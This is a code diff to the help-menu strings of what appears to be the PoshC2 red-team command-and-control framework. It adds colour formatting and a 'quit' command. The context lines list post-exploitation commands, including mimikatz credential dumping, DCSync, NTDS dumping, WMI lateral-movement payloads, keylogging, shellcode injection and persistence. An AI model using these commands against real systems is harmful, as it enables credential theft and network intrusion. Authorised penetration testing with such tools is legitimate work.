@@ -1,4 +1,5 @@
-logopic = r"""
+from Colours import Colours
+logopic = Colours.GREEN + r"""
  __________            .__.     _________  ________
  \_______  \____  _____|  |__   \_   ___ \ \_____  \\
   |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/
@@ -9,7 +10,7 @@ logopic = r"""
   """
 
 
-py_help1 = """
+py_help1 = Colours.GREEN + """
 Implant Features:
 =====================
 ps
@@ -35,9 +36,10 @@ back
 label-implant <newlabel>
 linuxprivchecker
 message "Message to broadcast"
+quit
 """
 
-sharp_help1 = """
+sharp_help1 = Colours.GREEN + """
 Implant Features:
 =====================
 ps
@@ -72,6 +74,7 @@ unhide-implant
 help
 searchhelp listmodules
 label-implant <newlabel>
+quit
 back
 
 Migration
@@ -149,7 +152,7 @@ run-exe <FullyQualifiedClassWithMainMethod> <MyBinaryAssemblyName>
 
 """
 
-posh_help1 = """
+posh_help1 = Colours.GREEN + """
 Implant Features:
 =====================
 ps
@@ -209,7 +212,7 @@ get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`nAMSI
 get-wmiObject -class win32_product
 """
 
-posh_help2 = """
+posh_help2 = Colours.GREEN + """
 Privilege Escalation:
 ====================
 invoke-allchecks
@@ -223,7 +226,7 @@ get-content 'c:\\programdata\\mcafee\\common framework\\sitelist.xml'
 dir -recurse | select-string -pattern 'password='
 """
 
-posh_help3 = """
+posh_help3 = Colours.GREEN + """
 File Management:
 ====================
 download-file -source 'c:\\temp dir\\run.exe'
@@ -255,7 +258,7 @@ net view | net users | net localgroup administrators | net accounts /dom
 whoami /groups | whoami /priv
 """
 
-posh_help4 = """
+posh_help4 = Colours.GREEN + """
 Active Directory Enumeration:
 ==================
 invoke-aclscanner
@@ -290,7 +293,7 @@ get-netuser -domain child.parent.com -filter samaccountname=test
 get-netgroup -domain child.parent.com | select samaccountname
 """
 
-posh_help5 = """
+posh_help5 = Colours.GREEN + """
 Domain / Network Tasks:
 ==================
 invoke-bloodhound -collectionmethod 'stealth' -csvfolder c:\\temp\\
@@ -318,7 +321,7 @@ invoke-pipekat -target <ip-optional> -domain <dom> -username <user> -password '<
 invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>
 """
 
-posh_help6 = """
+posh_help6 = Colours.GREEN + """
 Lateral Movement - powershell.exe:
 =========================================================
 invoke-runaspayload -user <user> -password '<pass>' -domain <dom>
@@ -343,7 +346,7 @@ invoke-wmijsproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 invoke-wmijsdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 """
 
-posh_help7 = """
+posh_help7 = Colours.GREEN + """
 Credentials / Tokens / Local Hashes (Must be SYSTEM):
 =========================================================
 invoke-mimikatz -command '"sekurlsa::logonpasswords"'
@@ -367,7 +370,7 @@ invoke-dcsync -pwdumpformat
 dump-ntds -emptyfolder <emptyfolderpath>
 """
 
-posh_help8 = """
+posh_help8 = Colours.GREEN + """
 Useful Modules:
 ====================
 get-screenshot
@@ -405,7 +408,7 @@ exit
 """
 
 
-pre_help = """
+pre_help = Colours.GREEN + """
 Main Menu:
 ================================
 use implant by <id>, e.g. 1
@@ -484,10 +487,10 @@ COMMANDS = ['loadmodule', "bloodhound", "brute-ad", "brute-locadmin",
 # post help commands python implant
 UXCOMMANDS = ["label-implant", "unhide-implant", "hide-implant", "help", "searchhelp", "python", "loadmodule",
               "loadmoduleforce", "get-keystrokes", "back", "upload-file", "download-file", "install-persistence", "remove-persistence", "sai",
-              "startanotherimplant-keepfile", "get-screenshot", "startanotherimplant", "pwd", "id", "ps", "setbeacon", "kill-implant", "linuxprivchecker"]
+              "startanotherimplant-keepfile", "get-screenshot", "startanotherimplant", "pwd", "id", "ps", "setbeacon", "kill-implant", "linuxprivchecker", "quit"]
 
 # post help commands sharp implant
-SHARPCOMMANDS = ["get-userinfo", "stop-keystrokes", "get-keystrokes", "delete", "move", "label-implant", "upload-file",
+SHARPCOMMANDS = ["get-userinfo", "stop-keystrokes", "get-keystrokes", "delete", "move", "label-implant", "upload-file", "quit",
                  "download-file", "get-content", "ls-recurse", "turtle", "cred-popper", "resolveip", "resolvednsname", "testadcredential",
                  "testlocalcredential", "get-screenshot", "modulesloaded", "get-serviceperms", "unhide-implant", "arpscan", "ls", "pwd", "dir",
                  "inject-shellcode", "start-process", "run-exe", "run-dll", "hide-implant", "help", "searchhelp", "listmodules", "loadmodule",
